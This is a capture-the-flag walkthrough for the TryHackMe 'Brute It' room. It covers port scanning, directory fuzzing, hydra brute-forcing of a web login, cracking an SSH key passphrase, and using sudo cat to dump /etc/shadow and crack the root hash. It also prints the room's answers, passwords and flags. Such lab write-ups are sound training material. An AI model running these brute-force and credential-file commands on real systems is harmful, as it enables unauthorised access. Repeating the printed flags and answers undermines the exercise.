# Brute It

![logo](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/648413ba-68d8-4bce-beb7-be79cce9134e)

## Reconnaissance

Let's nmap scan the target to find open ports :

```bash
nmap -sT -sV 10.10.140.109
```

![nmap](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/b9f1c508-92b8-4632-9ea2-65ae4c455893)

Ports `80` and `22` is open

* question #1 : How many ports are open? :  `2`

* question #2 : What version of SSH is running? : `OpenSSH 7.6p1`

* question #3 : What version of Apache is running? : `2.4.29`

* question #4 : Which Linux distribution is running? : `ubuntu`

Open a browser and navigate to matchine IP address, there is a default apache page

then we FUZZ the target with ffuff :

```bash
ffuf -w ~/wordlist/raft-medium-directories.txt  -u http://10.10.140.109/FUZZ -fc 403
```

![image](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/9f0755dd-14aa-407a-ab24-447dee18da11)

yes, there is an admin directory which we found with fuzzing

* question #5 : What is the hidden directory? : `/admin`

Next, browse to `/admin` directory :

![login](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/599e9b71-9b59-43e3-a175-f172f4b15a97)

SQLi does not work here, but when you see the page source you find a comment :

```html
<!-- Hey john, if you do not remember, the username is admin -->
```

we can now brute force the login page with `hydra`, to do this we need to find the exact parameters that is being sent to the server

as page source form element shows, two parameters (user, pass) are sent when you submit the form.

so we need to inform hydra with this information :

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.140.109 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -v
```

after a minute or two hydra will find the password for you :

![hydra](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/c1f7e047-4d5c-40f9-8c85-f944bd9ea79b)

now login to the website with `admin:xavier`

after logging in the page shows a flag and a link to download a private key :

![afterlogin](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/0b1827cb-001f-4fbe-b764-9264bc7e5a98)

download the private key which for user "john" and change the permission to `600` :

```bash
chmod 600 john.key
```

if you want to directly connect to machine with this private key, it asks for passphrase of this private key which we don't have it yet.

![ssh](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/ef7b4657-7ef9-4ee4-b766-f339b8a2640d)

so we should use `ssh2john` to brute force the passpharse :

```bash
ssh2john john.key > out.txt
```
and then use this hash text with `john` to find the passphrase :

```bash
john out.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![john](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/a034994e-d45e-4482-a1a7-1840878a5ca9)

## Getting a Shell

Now we can ssh to machine with john private key and `rockinroll` passphrase.

use `ls` to see the `user.txt` file and cat the content to find the flag.

```bash
cat user.txt
THM{a_password_is_not_a_barrier}
```

## Privilege Escalation

To see if any vector exists for privesc, we can use `sudo -l` :

```bash
sudo -l

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

yes, we can use cat as root, to find the root password we can cat the content of `/etc/shadow` :

```bash
sudo /bin/cat /etc/shadow
```

![shadow](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/df472b93-03ca-40a8-a1e8-1c7740515e49)

copy the first line and save it to a file like root.pass and use `john` again to brute force the hash

```bash
john root.pass --wordlist=/usr/share/wordlists/rockyou.txt
```

![br](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/e44d6e64-42cc-496c-b7f8-ee97def03ff6)

to find the last flag just cat the root.txt in `/root` :

```bash
sudo /bin/cat /root/root.txt

THM{pr1v1l3g3_3sc4l4t10n}
```
